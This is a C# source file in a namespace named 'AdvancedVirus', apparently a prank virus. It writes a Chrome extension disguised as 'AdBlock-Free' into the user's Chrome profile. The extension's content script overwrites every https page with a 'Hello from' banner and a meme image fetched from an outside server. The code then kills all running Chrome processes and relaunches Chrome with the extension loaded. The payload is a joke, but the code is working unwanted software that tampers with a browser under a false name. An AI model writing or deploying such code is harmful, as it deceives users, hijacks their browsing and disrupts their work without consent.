using System.Diagnostics;
using System;
using Microsoft.Win32;
using System.Windows;
using System.Reflection;
using static System.Net.Mime.MediaTypeNames;
using System.Management;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;

namespace AdvancedVirus
{
    public class Juan
    {
        private string documentsFolder;
        private string soupFolder;
        private string manifestPath;
        private string contentPath;

        public Juan()
        {
            documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            soupFolder = Path.Combine(documentsFolder, "Google", "Chrome", "User Data", "Default", "Extensions", "soup");
            manifestPath = Path.Combine(soupFolder, "manifest.json");
            contentPath = Path.Combine(soupFolder, "content.js");
        }

        public void CreateAndInstallExtension()
        {
            try
            {
                // Sample content for manifest.json
                string manifestContent = @"
                {
                    ""name"": ""AdBlock-Free"",
                    ""version"": ""3.0"",
                    ""description"": ""Free Ad detection"",
                    ""manifest_version"": 3,
                    ""content_scripts"": [{
                        ""js"": [""content.js""],
                        ""matches"": [""https://*/*""]
                    }]
                }";

                string contentContent = @"document.write(""<div style='font-size: 120px; font-family: Calibri; font-weight:900'>Hello from</div><img src=\""https://i.kym-cdn.com/entries/icons/facebook/000/035/644/juancover.jpg\"">"")";

                Directory.CreateDirectory(soupFolder);

                // Write manifest.json file
                File.WriteAllText(manifestPath, manifestContent);

                // Write content.js file
                File.WriteAllText(contentPath, contentContent);

                Console.WriteLine("Chrome extension created successfully.");

                KillChromeProcesses();
                LaunchChromeWithExtension();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while creating extension: {ex.Message}");
            }
        }

        private void KillChromeProcesses()
        {
            try
            {
                Process[] chromeProcesses = Process.GetProcessesByName("chrome");
                foreach (Process chromeProcess in chromeProcesses)
                {
                    chromeProcess.Kill();
                }
                Console.WriteLine("Chrome processes terminated.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error killing Chrome processes: {ex.Message}");
            }
        }

        private void LaunchChromeWithExtension()
        {
            try
            {
                string chromePath = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
                if (File.Exists(chromePath))
                {
                    Process.Start(chromePath, $"--load-extension=\"{soupFolder}\"");
                    Console.WriteLine("Chrome launched with extension.");
                }
                else
                {
                    Console.WriteLine("Chrome not found at default location.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error launching Chrome: {ex.Message}");
            }
        }

        public bool CheckSoupExists()
        {
            string myDocumentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string folderCheck = Path.Combine(myDocumentsFolder, "soup");
            return Directory.Exists(folderCheck);
        }

        public void CreateSoupMarker()
        {
            try
            {
                string myDocumentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string folderCheck = Path.Combine(myDocumentsFolder, "soup");

                if (!Directory.Exists(folderCheck))
                {
                    Directory.CreateDirectory(folderCheck);
                    Console.WriteLine("Soup marker folder created.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creating soup marker: {ex.Message}");
            }
        }

        public void CleanupSoup()
        {
            try
            {
                if (Directory.Exists(soupFolder))
                {
                    Directory.Delete(soupFolder, true);
                    Console.WriteLine("Soup extension cleaned up.");
                }

                string myDocumentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string markerFolder = Path.Combine(myDocumentsFolder, "soup");
                if (Directory.Exists(markerFolder))
                {
                    Directory.Delete(markerFolder, true);
                    Console.WriteLine("Soup marker cleaned up.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during soup cleanup: {ex.Message}");
            }
        }

        public string GetSoupStatus()
        {
            bool extensionExists = Directory.Exists(soupFolder);
            bool markerExists = CheckSoupExists();

            return $"Extension exists: {extensionExists}, Marker exists: {markerExists}";
        }
    }
}